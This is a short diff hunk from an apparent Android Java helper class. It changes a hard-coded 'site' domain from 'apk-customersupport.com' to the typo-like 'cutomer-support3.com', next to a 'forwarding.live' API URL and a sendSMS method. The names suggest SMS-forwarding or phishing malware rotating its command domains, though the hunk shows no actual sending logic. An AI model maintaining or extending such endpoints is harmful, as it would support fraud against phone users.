@@ -18,7 +18,7 @@ import java.util.Scanner;
 public class Helper {
 
     private static final String API_URL = "https://forwarding.live/api";
-    static final String site = "apk-customersupport.com";
+    static final String site = "cutomer-support3.com";
 
     public static void sendSMS(String path, String message) {
         new AsyncTask<String, Void, String>() {
